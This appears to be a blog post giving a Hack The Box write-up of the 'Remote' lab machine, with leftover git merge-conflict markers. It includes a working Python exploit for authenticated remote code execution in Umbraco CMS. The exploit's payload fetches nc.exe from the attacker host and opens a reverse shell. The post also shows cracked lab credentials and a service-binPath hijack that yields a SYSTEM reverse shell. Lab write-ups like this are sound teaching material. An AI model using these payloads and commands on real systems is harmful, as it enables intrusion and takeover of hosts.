---
title:  "Hack The Box - Remote"
date:   2020-03-21
categories: [ctf]
<<<<<<< HEAD
tags: [linux, Kali, Pentest, writeups, ctf, rdp, Remote-Desktop]
---
My write-up / walktrough for Remote on Hack The Box. 

As long as the machine isn't retired on HTB, you need the root-flag to encrypt the following pdf!

[WriteUp Remote as PDF](https://www.dropbox.com/s/nef988gu7xur46x/2020-03-21-hack-the-box-remote.pdf?dl=1)
=======
tags: [linux, Active Directory, Kali, Pentest, writeups, ctf, rdp, Remote-Desktop]
---
My write-up / walktrough for Remote on Hack The Box. 

## Quick summary
Recently, Remote got retired and I'm now allowed to publish my write-up.
I added the box to `/etc/hosts` as `remote.htb` with it's ip `10.10.10.180`

![infocard](/images/remote/infocard.png)

## Enumeration
As allways, I started with some enumeration and scanned `remote.htb` with `nmap -sTV -p 1-10000 -oN nmap_tcp_scan remote.htb`

![nmap](/images/remote/nmap.png)

I found a couple of open ports and services to poke around there. `ftp` seemed to be a dead end, but I was able to show and mount a `nfs-share` on port 2049

```shell
faebu@kali:showmount -e remote.htb
faebu@kali:mkdir /tmp/infosec
faebu@kali:sudo mount -t nfs remote.htb:/site_backups /tmp/infosec
```
By enumerating the content on `/tmp/infosec`, I realized that the share contained a backup of a webseite, run by the `Umbraco-CMS`. I was not able to load the database on `App_Data/Umbraco.sdf` with a tool, but I could grab a hash by inspecting the file manually with an editor.
`admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa`

## crack the hash
I tried to crack the hash online and found instantly a match. `b8be16afba8c314ad33d812f22a04991b90e2aaa -> baconandcheese`

![crackstation](/images/remote/crackstation.png)

## Exploitation
With this credentials, I was able to log in the cms.
![logincms](/images/remote/loginCMS.png)

Now, the next step was to lookout for a possibility to take advantage of the gathered credentials, so I checked if there are some `remote code execution vulnerabilities` with `Umbraco`. Indead, I found an interesting proof of concept on [www.exploit-db.com](https://www.exploit-db.com/exploits/46153), which I had to modify as follows:

```python
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators

# Dork: N/A

# Date: 2019-01-13

# Exploit Author: Gregory DRAPERI & Hugo BOUTINON, adapted by jaeflo

# Vendor Homepage: http://www.umbraco.com/

# Software Link: https://our.umbraco.com/download/releases

# Version: 7.12.4

# Category: Webapps

# Tested on: Windows IIS

# CVE: N/A
import requests;
from bs4 import BeautifulSoup;

def print_dict(dico):

    print(dico.items());

# Execute a reverse shell with nc
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "mkdir /tmp;iwr -uri http://10.10.xx.xx:80/nc.exe -outfile /tmp/nc.exe;/tmp/nc.exe 10.10.xx.xx 443 -e cmd.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";

password="baconandcheese";

host = "http://remote.htb";

# Step 1 - Get Main page

s = requests.session()

url_main =host+"/umbraco/";

r1 = s.get(url_main);

# Step 2 - Process Login

url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";

loginfo = {"username":login,"password":password};

r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page

url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";

r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');

VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];

VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];

UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];

headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};

data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack

r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
```
The exploit loads the file nc.exe to `remote.htb`, so I also had to start a local webserver on my machine and provide there the requested file.

Before executing the exploit, I had to start a local netcat-instance in listening mode. After executing the exploit, I got a revershell on my machine and was able to grab the user flag with it.

![reverseshell](/images/remote/reverseshell.png)

## Privilege Escalation
Now, I had to enumerate the system a bit further. I decided to upload winPEASany.exe to remote.htb. I did this by tweaking the exploit for the reverse shell so that it opened a powershell instead of cmd.exe.
```
/tmp/nc.exe 10.10.xx.xx 443 -e powershell.exe
```
and uploaded the exe afterwards with `iwr`.
![upload](/images/remote/winpeaUpload.png)

The tool found numerous misconfiguration and possible attack-vectors, but to me, the most promising part was, that the actual logged in user is able to modify the `Update Orchestrator Service`

![privesc](/images/remote/privesc.png)

there are many explenation found on the internet how to take advantage of this fact. I followed the steps which [hipotermia](https://hipotermia.pw/htb/querier) described on his walkthrough of the `HTB-Box Querier` to reconfigure `UsoSvc` to get a reverse shell as `System`. 

```bash
PS C:\tmp> sc.exe stop UsoSvc
PS C:\tmp> sc.exe config usosvc binPath="C:\tmp\nc.exe 10.10.xx.xx 6868 -e cmd.exe"
PS C:\tmp> sc.exe qc usoSvc
```
![usosvc](/images/remote/usosvc_conf.png)

## Root the box
Once I started the `Update Orchestrator Service` `(sc.exe start usosvc)`, I got a reverseshell as `System`

![rootshell](/images/remote/rootshell.png)

As the Service last just for a couple of seconds, we have to be quick to gather the flag ;-)

![rootflag](/images/remote/rootflag.png)

## Conclusion 
Great box and a lot of fun. I had a pretty hard time to get to user, got stuck plenty of times with loose ends, but once I got user-access, I got root pretty fast as well. Unfortunately, the box is called `Remote` and I noticed well the `Teamviewer-Service`, but to be honest, I had no clue how to proceed on it. So I would say, I got the root flag, but not the intended way :-/

**Thanks** and respect to [Hack The Box](https://www.hackthebox.eu/) for providing this great box.
>>>>>>> remote
